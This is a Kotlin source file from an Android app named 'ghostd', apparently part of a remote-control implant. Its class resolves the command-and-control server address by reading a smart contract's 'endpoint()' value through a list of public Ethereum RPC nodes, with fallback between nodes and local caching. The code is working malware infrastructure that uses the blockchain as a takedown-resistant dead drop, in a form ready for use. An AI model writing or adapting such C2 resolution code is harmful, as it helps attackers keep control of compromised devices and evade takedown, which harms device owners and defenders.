package com.tg.ghostd

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

/**
 * Resolves the C2 server endpoint (host[:port] or ws://…/wss://… URL) by
 * reading `endpoint()` from the on-chain contract through a list of public
 * RPCs, with fallbacks. Last-good endpoint is cached; cache is used when
 * every RPC fails.
 *
 * Pure logic is kept here (no Android imports) so it is JVM-testable; the
 * Android glue (SharedPreferences cache) is injected via lambdas.
 */
class EndpointResolver(
    private val rpcUrls: List<String>,
    private val contractAddress: String,
    private val selector: String,
    private val readCache: () -> String?,
    private val writeCache: (String) -> Unit,
    private val log: (String) -> Unit = {}
) {
    /** Fresh chain read with RPC fallback; falls back to the local cache. */
    fun resolve(): String? = fetchFresh() ?: readCache()

    /**
     * Try every RPC; return the normalized endpoint or null.
     * Successful reads update the cache.
     */
    fun fetchFresh(): String? {
        for (rpc in rpcUrls) {
            try {
                val result = ethCall(rpc)
                if (result == null) {
                    log("RPC $rpc: empty/no-result response")
                    continue
                }
                val ep = AbiCodec.decodeString(result)?.trim()
                if (!ep.isNullOrEmpty()) {
                    val normalized = normalize(ep)
                    writeCache(normalized)
                    return normalized
                }
                log("RPC $rpc: decode failed for $result")
            } catch (e: Exception) {
                log("RPC $rpc failed: ${e.javaClass.simpleName}: ${e.message}")
                // try next RPC
            }
        }
        return null
    }

    private fun ethCall(rpcUrl: String): String? {
        val callObj = JSONObject().put("to", contractAddress).put("data", "0x$selector")
        val params = JSONArray().put(callObj).put("latest")
        val body = JSONObject()
            .put("jsonrpc", "2.0").put("id", 1)
            .put("method", "eth_call")
            .put("params", params)
            .toString()
        val raw = httpPost(rpcUrl, body) ?: return null
        return JSONObject(raw).optString("result", null)
    }

    private fun httpPost(url: String, body: String): String? {
        val conn = URL(url).openConnection() as HttpURLConnection
        return try {
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 10_000
            conn.readTimeout = 10_000
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "ghostctl/0.2")
            conn.setFixedLengthStreamingMode(body.toByteArray(Charsets.UTF_8).size)
            conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
            val code = conn.responseCode
            if (code !in 200..299) {
                android.util.Log.w("ghostd", "RPC $url: HTTP $code")
                return null
            }
            BufferedReader(InputStreamReader(conn.inputStream, Charsets.UTF_8)).use {
                it.readText()
            }
        } finally {
            conn.disconnect()
        }
    }

    companion object {
        /** Ensure the endpoint is a usable ws:// or wss:// URL. */
        fun normalize(endpoint: String): String =
            if (endpoint.startsWith("ws://") || endpoint.startsWith("wss://") ||
                endpoint.startsWith("http://") || endpoint.startsWith("https://")
            ) endpoint.replaceFirst("http://", "ws://").replaceFirst("https://", "wss://")
            else "ws://$endpoint"

        /** Android wiring: contract constants + SharedPreferences cache. */
        fun forContext(ctx: Context) = EndpointResolver(
            rpcUrls = C2.RPC_URLS,
            contractAddress = C2.CONTRACT_ADDRESS,
            selector = C2.ENDPOINT_SELECTOR,
            readCache = { Prefs.cachedEndpoint(ctx) },
            writeCache = { Prefs.setCachedEndpoint(ctx, it) },
            log = { android.util.Log.w("ghostd", it) }
        )
    }
}
